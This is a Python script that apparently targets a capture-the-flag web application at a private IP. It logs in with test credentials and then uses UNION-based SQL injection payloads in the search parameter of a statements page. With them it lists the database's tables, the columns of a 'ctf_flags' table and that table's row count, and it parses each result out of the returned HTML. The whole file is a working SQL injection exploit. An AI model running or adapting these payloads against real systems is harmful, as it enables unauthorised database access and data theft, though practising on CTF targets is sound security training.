#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar
import re

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'email': 'alice@example.com',
        'password': 'password123'
    }).encode()

    req = urllib.request.Request(login_url, data=login_data, method='POST')
    opener.open(req, timeout=10)

    # Check: List all tables
    print("[1] Tables in database:")
    payload = "abc' Union select 1,2,3,4,GROUP_CONCAT(TABLE_NAME),6,7 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    tables = re.search(r'<td class="py-2 text-slate-200 text-sm">([^<]+)</td>', html)
    if tables:
        print(f"  {tables.group(1)}")

    # Check: Columns in ctf_flags
    print("\n[2] Columns in ctf_flags:")
    payload = "abc' Union select 1,2,3,4,GROUP_CONCAT(COLUMN_NAME),6,7 FROM information_schema.COLUMNS WHERE TABLE_NAME='ctf_flags'#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    columns = re.search(r'<td class="py-2 text-slate-200 text-sm">([^<]+)</td>', html)
    if columns:
        print(f"  {columns.group(1)}")
    else:
        print("  (no columns found)")

    # Check: Data in ctf_flags
    print("\n[3] Data in ctf_flags:")
    payload = "abc' Union select 1,2,3,4,CONCAT('Count: ',COUNT(*)),6,7 FROM ctf_flags#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    count_result = re.search(r'Count:\s*(\d+)', html)
    if count_result:
        print(f"  Rows: {count_result.group(1)}")
    else:
        print("  (no data)")

except Exception as e:
    print(f"Error: {e}")
